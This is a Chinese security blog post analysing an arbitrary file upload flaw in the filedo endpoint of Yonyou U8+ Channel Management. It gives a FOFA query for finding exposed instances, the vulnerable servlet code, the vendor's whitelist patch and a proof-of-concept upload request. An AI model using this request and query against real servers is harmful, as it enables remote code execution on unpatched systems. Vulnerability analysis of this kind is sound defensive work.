---
title: "用友U8+渠道管理(高级版) filedo 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-filedo-upload-rce.html
asset_dir: assets/用友u8+渠道管理(高级版)-filedo-文件上传漏洞
---

# 用友U8+渠道管理(高级版) filedo 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/22 08:08
* 777浏览
* [0评论](#comment)
* 1小时阅读

深入探索

软件

SQL

服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友网络科技股份有限公司推出的企业管理综合平台，广泛应用于财务、进销存、人力资源等企业核心业务系统中。在U8+渠道管理（高级版）模块中，存在一处[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，位于其 `filedo` 接口。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

漏洞预警服务

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"
>
> 计算机服务器

# 漏洞分析

深入探索

漏洞扫描器

网络安全课程

防火墙软件

根据补丁变化

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-001-24c8de250da2.webp)](https://image.mrxn.net/1bae07efe9c04506b576186a6e75bb6a.webp)

直接看 `UploadServlet` 在那里引用了

深入探索

SQL注入防护

安全认证考试

漏洞扫描服务

```
<servlet>
    <servlet-name>UploadServlet</servlet-name>
    <servlet-class>com.gxfcsoft.framework.core.UploadServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>UploadServlet</servlet-name>
    <url-pattern>*.filedo</url-pattern>
</servlet-mapping>
```

ok，根据servlet的映射，任意以`.filedo` 结尾的请求都会经由`UploadServlet` 处理，跟进看下它的实现逻辑

```
package com.gxfcsoft.framework.core;

import com.alibaba.fastjson.JSONObject;
import com.gxfcsoft.framework.base.util.Oid;
import com.gxfcsoft.framework.base.util.PathUtil;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.ProgressListener;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

public class UploadServlet extends HttpServlet {
    private static final long serialVersionUID = -298116318701283790L;

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String savePath = PathUtil.getAttachAbsoluteDirectory("default");
        String newname = "";
        String oldname = "";
        String message = "1";
        resp.setCharacterEncoding("utf-8");
        resp.setContentType("text/html;charset=utf-8");
        PrintWriter outPrint = resp.getWriter();

        try {
            File saveFile = new File(savePath);
            DiskFileItemFactory factory = new DiskFileItemFactory();
            factory.setSizeThreshold(102400);
            factory.setRepository(saveFile);
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setProgressListener(new ProgressListener() {
                public void update(long arg0, long arg1, int arg2) {
                }
            });
            upload.setHeaderEncoding("UTF-8");
            upload.setFileSizeMax(5242880L);
            upload.setSizeMax(20971520L);
            List<FileItem> list = upload.parseRequest(req);
            if (list.size() == 0) {
                message = "500";
            }

            String code = "";
            JSONObject obj = new JSONObject();
            List<Map<String, String>> lists = new ArrayList();
            Map<String, String> map = new LinkedHashMap();

            for(FileItem item : list) {
                if (item.isFormField()) {
                    code = item.getString("utf-8");
                } else {
                    String filename = item.getName();
                    filename = filename.substring(filename.lastIndexOf("\\") + 1);
                    String suffix = filename.substring(filename.indexOf("."));
                    String randomName = Oid.getOid() + suffix;
                    if (newname == "") {
                        newname = randomName;
                    } else {
                        newname = newname + ";" + randomName;
                    }

                    if (oldname == "") {
                        oldname = filename;
                    } else {
                        oldname = oldname + ";" + filename;
                    }

                    savePath.replace("", "");
                    InputStream in = item.getInputStream();
                    FileOutputStream out = new FileOutputStream(savePath + "\\" + randomName);
                    byte[] buffer = new byte[1024];
                    int len = 0;

                    while((len = in.read(buffer)) > 0) {
                        out.write(buffer, 0, len);
                    }

                    in.close();
                    out.close();
                    item.delete();
                }
            }

            map.put("oldname", oldname);
            map.put("newname", newname);
            lists.add(map);
            obj.put("fileInfo", lists);
            obj.put("flag", "0");
            outPrint.print(obj);
        } catch (IOException e) {
            message = "1";
            e.printStackTrace();
        } catch (FileUploadException e) {
            message = "1";
            e.printStackTrace();
        } finally {
            outPrint.flush();
            outPrint.close();
        }

    }
}
```

文件后缀从上传文件名中获取，然后拼接到`randomName`后面形成新的文件名，期间对文件类型和内容无校验或过滤，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，非常朴实无华！和[U8+渠道管理(高级版) imagedo 文件上传漏洞](https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html)一模一样的漏洞成因！

漏洞预警服务

其实 **UploadTestServlet** 也存在同样的任意文件上传漏洞，不过需要合法session

```
    <!-- 上传图片，应该作废此方法 -->
    <servlet>
        <servlet-name>UploadTestServlet</servlet-name>
        <servlet-class>com.gxfcsoft.framework.core.UploadTestServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>UploadTestServlet</servlet-name>
        <url-pattern>/business/test/upload.imgdo</url-pattern>
    </servlet-mapping>
```

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-002-ead9ab1959d9.webp)](https://image.mrxn.net/ebf66d0d6b2a4918a38e2d7934cde93a.webp)

补丁修复也是正则白名单检测

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-003-7e0a7c397b8f.webp)](https://image.mrxn.net/a6fcda8bca9f4b36b941ab31d1d38af4.webp)

# 漏洞复现

```
POST /temp.filedo HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.PNG"

TEST
------WebKitFormBoundary--
```

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-004-84aa7066cbdb.webp)](https://image.mrxn.net/8fb74229788e43c2b10ac708839dadc4.webp)

根据**getAttachAbsoluteDirectory**方法可知

漏洞预警服务

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-005-c1cf252dc977.webp)](https://image.mrxn.net/236b1c1367524a398658a853f084a324.webp)

上传位置默认为 `/userfile/default/attach/` 目录下，访问上传文件

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-006-8127bc12fee9.webp)](https://image.mrxn.net/d89bcdc2bc73461198e4221fdf1230ab.webp)

成功[执行我们上传代码](https://mrxn.net/tag/rce)

官方补丁修复也很直接，直接正则检测后缀是否为白名单

[![用友U8+渠道管理(高级版) filedo 文件上传漏洞](images/img-007-e7e94b4cb59f.webp)](https://image.mrxn.net/042146d5377b46a3b374769987919d1f.webp)

# 参考

* [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)
* <https://security.yonyou.com/#/patchInfo?identifier=29c55387e6274480b613343d8ffcd4e2>

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友U8+渠道管理(高级版) filedo 文件上传漏洞](https://mrxn.net/jswz/yonyou-filedo-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-filedo-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

文件大小转换

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKi0lEQVR4Aeyd0XojqQ6E8+/7v/McF0qBDDRub+y4zw77RS6pVBIENbZn5mL/+fr6+vNT+3Piv7yG5Zmz75xwxonPZk3GnLfvvONHaH3GVU3W/cTXQG71++cqJ1AHcpv+1zM2+wWAL+AuBRQu974TfAfOQ+iB70wDoPSChi17u+p//pTfIXMQ2ll/iNxK7zph1q18aZ+x3KsOJJPb/9wJDAOBeGpgjv92q9D6uUd+isxldB6iNufsWyM0l1G8zJx8mzmI/kC5YcpD42Y6iLxzM4TQwBxnNcNAZqLN/d4J7IH83lmfWuktA4F2Rb0LvQ3YzMGocy5jX6fcjIPWD8KXVgb3sbiVub/QOvm9OfcqfMtAXrW5v7HP2wfiJwriCQWm5wyUr7Q5CcFB4CyXuZW/2odzQhjXWvV9de49A3n1Lv+ifnsgFxv2MBBd25Wd2X+uh+O3gKyzn/ubM+acfYj+gKklulfGZcEtCRy+nd7Shz95jZk/KxwGMhNt7vdOoA4E4imAc/jsFvMTArFG7gHBPdK5xjrHwhknXgbRX74NRs65nyBEXziHea06kExu/3MnsAfyubOfrvyPr/lP0J3dA9pVdS6jdTMOWq11EFzWw8jlfO/3vYBe8lTsfi5y/FPcN8QnehEcBgKUr3jAdItAzcPcnxY+ICF65SdsVWLdTOOcEKLvSgehAWay+lfyOQncncMqB/dauI9z7TCQnLyY/1dspw4EYmr5t4bgoKHzevpsPedY2GvEQfSTvzII3azHmTpo/+C00s9yEGvDHF3jvUHT9TlrhM4JFcug1daBSLDt8yewB/L5Gdzt4B+I62JWV6g354TOQdQBog8NKB9+WbDqAaEHcknxXScESl/5tiLqXiB0EGitEILrSkqofG8l8f3i3Hc4BYj+0HAqTOS+IekwruDWPxh6M9CmCeH7aRDCyPW10vVmjRDGHr1esbQyCD00FC+DxkH4qu1N2t6s6fk+huibebjn3EtonXzbjIP7HtLsG6JTuJDtgVxoGNrK8KEusjeIqwXUFFA+VIHK9dezJjrHOqD2gNG3zuWOheYyipdlDqKveBlEDA3F95Z79DnFOS8fxn7ibaqROT7CfUOOTuZDfP1Q1/Rks32ItznvWGgO2lMCx771qu3NuYzWQOtpLuvsQ9P1nONHCGOPRzXOQ9Q6FsLIzX6HfUN0WheyPZALDUNbGQbia5QR4roBqikG1A/kQtxeXHNzhx/nhNBqIfyh4EbAfU61NrjP3eT1x5qMNTlxIHoBk+yaAso5ZJXXzZx9CD1g6g6Hgdxld/DrJ1C/9gLDpFe78VOQEaJH5s72gKjNevfJnP1VzppH6B4ZXTPjIPYIWHYacz/7s+J9Q2an8kFuD+SDhz9bevhzCFDeuoCq9xUTmgSqDsJXXgYRQ/sXO2ice8xQ9bY+D2MPa4XWw1onrWymh6h1LqNqesv5lQ/HfXPdviH5NF7n/+tOdSAQE8xPAAQ365519uFYP+sBoYd2k7IOWh6aRutlnX0IvWMhBAcjKt+besug6a2BxkH4zmWEMaeeMogcNMy1dSCZ3P7nTqB+7fUWYJwcNE5TlkHjIHz3UN5mbobWCCF6QEPxslkthG6WU42tz5sXwtgDglPe1vdQ7JxRXG8QvYA+VeJZ7b4h5Wiu87IHcp1ZlJ0MX3t9jYRFcXuRb7uF5cexsBC3F/ky4PArsfI3afmBpivEgxdoevWRQeNm5dJkg1Gf8+4Bax20POCygrmffaCciWMhjNy+IeUIr/NyaiAQk4Q5+teByDt+hHpKbNY6FsJz/dwDog5GtCYjNJ3WleW8fRh10sqseQZVJ4PW99RAnllka392AnsgPzu/l1fXP4dAuzYQvq6TLK+q+BnLtfZd7/gIVzqIPebamd7cDHOtfYi+We9cRggdBM5ymTvr7xty9qR+Sbf82gsx/fy0QHDQ0HuF4BwLXSu/Nwg9UFNA+XoIVM49Mjo545z7N+h+uRYoe8qcdTO0DqIO2t/DQeOsy7hvSD6NC/h7IBcYQt7C8kPdQhivWb6q1plzLIRWC+GLl1kvVNwb3Ov7vGIIDaCwmPrZgPJ2AyNaU4q+XyB032GBlQ5CDw1n+tLo9uKcEKLmRteffUPqUVzDqQPRxGR5W4qPDGK6QC0BytNYieTkPqYh9ICpKQIv65v3AdE3c9MNfJNndTD2heC+Wx1CHcihYid+9QTqQCAmmJ8CCC7vCILLOufNOc4IUQdU2nphJRcOUG4KtK+RWQ6Rz5x9rSFzLFQsg6iD1hcaB6Ovumzq96y5PtfVgWTyvf7uvjqBPZDV6XwgV/+kvlob2pX1NYPG9bVwnOu1q9hrWeNYaA6eWwuaHsJ3LyEEpzV6U/7Ieq1iiF5ALQPq224lk7NvSDqMK7h1IJqo7NGmICYsra2vMX+EED2gYd9DMURe/pHN1sha5+Fxr1z3yIfoB4FZD8F5baHz8m3mMtaBZHL7nzuBPZDPnf105fp3WdPsgoS4ltDQclhzvrIZXZu53rcmI4xr5fwZP6+z0s905qDtw1zuNeMgarJu35B8GhfwT33t9XSF3rN8m7kZwvgUQHDQ8JleQF3KdUKgfKWsyR84EL2gYW6n9WSZsw9R41gIwUFD1cuUt/1nboh/of933AO52ATrhzq0qwThe68QMWCqvDUABSv57ega9vadeggQPYGqBYZ1IDho2K+pGCLvZuJs5mZoTUaIXjBi1p3tN9PtGzI7lQ9y9UPdE57txbkjdA3Ek+P4EeZ+1j7inJ/pIdaHhtatENZ6iLzXFrqffBmEBtZ/he86IUSN6m37huhkLmR7IBcahrYyfKj76gglkEFcLUBhMaB80EK7oqqRFcGJF2g9IPxZGYw5rSODyMG4D+XdT77MsVBxb+J7s6bnFUOsL98GI+dcxlnffUPyCV3AX36oe4IZvecZB8dPxkw/49xfCMf94HEOUJtDA+oth/APxbcEhAa4RfGTf4feD8X9K1DXdAYat2+IT2WKv08OnyHQpgXn/NW2YezhJ2lWB03vvPVwnJMGIi/f5h4QOWjYa6Q1B00H4TsnlDYbhAbI9NP+viFPH9l7C/ZA3nu+T3evA9E1fMZWKwH1g8s9V/qcsz6j8zPOOaHz8m3mZgixz5yb1ZmD0AOmKs561GRyHunqQFLNdj94AsNAgPp0w+iv9pqnb996x0KIvs4Jxcvk2+BeBxEDliz3Ck1XCyYOsOwzKakUHNdW0QNHv7dtGMiD2p1+8wnsgbz5gJ9t/5aBwPE1BuoegeGtoiaTA6HztRam9OAqbxuSLyLcf4arJSB+F5jjWway2tDOfX2tzuClA4GY+mpB5WZPlTmIHoCkxZwrwYkXoN68E/I7yWot54QugljLsVB5mfzexNv6nOKXDkQNt/3sBPZAfnZ+L68eBuLrdISrHcxqrM85c4/QNTOdcxmtyxzcv6VAxIDl9f91qzqT8ntzTgiUt0VrIGJA6WLOCQvRvYjvbRhIV7PDXz6BOhCgTBzO4Wqf0HpYB42D0bcuPzHmVgitl3VwzFkj9FrybRC1jjNC5IBKA+Xc3EvoJEQOMDVFoPQAvupAvvZ/lziBPZBLjKFt4n8AAAD//wi3oyoAAAAGSURBVAMAIVI6p6zPsdkAAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-filedo-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKi0lEQVR4Aeyd0XojqQ6E8+/7v/McF0qBDDRub+y4zw77RS6pVBIENbZn5mL/+fr6+vNT+3Piv7yG5Zmz75xwxonPZk3GnLfvvONHaH3GVU3W/cTXQG71++cqJ1AHcpv+1zM2+wWAL+AuBRQu974TfAfOQ+iB70wDoPSChi17u+p//pTfIXMQ2ll/iNxK7zph1q18aZ+x3KsOJJPb/9wJDAOBeGpgjv92q9D6uUd+isxldB6iNufsWyM0l1G8zJx8mzmI/kC5YcpD42Y6iLxzM4TQwBxnNcNAZqLN/d4J7IH83lmfWuktA4F2Rb0LvQ3YzMGocy5jX6fcjIPWD8KXVgb3sbiVub/QOvm9OfcqfMtAXrW5v7HP2wfiJwriCQWm5wyUr7Q5CcFB4CyXuZW/2odzQhjXWvV9de49A3n1Lv+ifnsgFxv2MBBd25Wd2X+uh+O3gKyzn/ubM+acfYj+gKklulfGZcEtCRy+nd7Shz95jZk/KxwGMhNt7vdOoA4E4imAc/jsFvMTArFG7gHBPdK5xjrHwhknXgbRX74NRs65nyBEXziHea06kExu/3MnsAfyubOfrvyPr/lP0J3dA9pVdS6jdTMOWq11EFzWw8jlfO/3vYBe8lTsfi5y/FPcN8QnehEcBgKUr3jAdItAzcPcnxY+ICF65SdsVWLdTOOcEKLvSgehAWay+lfyOQncncMqB/dauI9z7TCQnLyY/1dspw4EYmr5t4bgoKHzevpsPedY2GvEQfSTvzII3azHmTpo/+C00s9yEGvDHF3jvUHT9TlrhM4JFcug1daBSLDt8yewB/L5Gdzt4B+I62JWV6g354TOQdQBog8NKB9+WbDqAaEHcknxXScESl/5tiLqXiB0EGitEILrSkqofG8l8f3i3Hc4BYj+0HAqTOS+IekwruDWPxh6M9CmCeH7aRDCyPW10vVmjRDGHr1esbQyCD00FC+DxkH4qu1N2t6s6fk+huibebjn3EtonXzbjIP7HtLsG6JTuJDtgVxoGNrK8KEusjeIqwXUFFA+VIHK9dezJjrHOqD2gNG3zuWOheYyipdlDqKveBlEDA3F95Z79DnFOS8fxn7ibaqROT7CfUOOTuZDfP1Q1/Rks32ItznvWGgO2lMCx771qu3NuYzWQOtpLuvsQ9P1nONHCGOPRzXOQ9Q6FsLIzX6HfUN0WheyPZALDUNbGQbia5QR4roBqikG1A/kQtxeXHNzhx/nhNBqIfyh4EbAfU61NrjP3eT1x5qMNTlxIHoBk+